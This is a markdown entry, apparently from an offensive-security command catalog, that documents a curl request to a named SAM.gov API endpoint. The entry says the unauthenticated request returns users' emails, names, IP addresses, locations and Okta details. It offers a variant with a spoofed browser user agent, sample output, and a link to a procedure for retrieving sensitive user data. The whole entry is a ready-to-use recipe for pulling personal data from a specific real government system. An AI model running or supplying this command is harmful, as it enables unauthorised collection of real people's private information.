---
data: 'curl -X GET "https://sam.gov/api/prod/iam/cws/v1/applications/"'
tags:
  - recon
  - information-disclosure
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0f5aebdc-502f-416d-a7db-76a4812c2594
created_at: '2025-12-14T17:32:10.304Z'
updated_at: '2025-12-14T17:32:10.304Z'
verified: false
validated: true
submitted: true
---
# curl-get-sam-api-applications

## Command

```bash
curl -X GET "https://sam.gov/api/prod/iam/cws/v1/applications/"
```

## Description

This command uses curl to perform an unauthenticated GET request to the SAM.gov API endpoint, retrieving a JSON list of application objects containing sensitive user PII such as emails, names, IP addresses, locations, and Okta details. It is used in reconnaissance to disclose information from public-facing web services without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL | The target API endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://sam.gov/api/prod/iam/cws/v1/applications/"
```

### Advanced Usage

```bash
curl -X GET "https://sam.gov/api/prod/iam/cws/v1/applications/" -H "User-Agent: Mozilla/5.0" | jq '.'
```

This adds a user-agent header to mimic a browser and pipes output to jq for pretty-printing JSON.

## Expected Output

A JSON array of objects, e.g.:

```json
[
  {
    "email": "user@example.com",
    "name": "John Doe",
    "ip": "192.168.1.1",
    "location": "123 Main St, City, State",
    "okta_integration": true
  }
]
```
Successful run returns HTTP 200 with the data; errors indicate endpoint changes or protections.

## Related

- [[Related Procedure: Retrieve-Sensitive-User-Data-via-Exposed-API-Endpoint]]
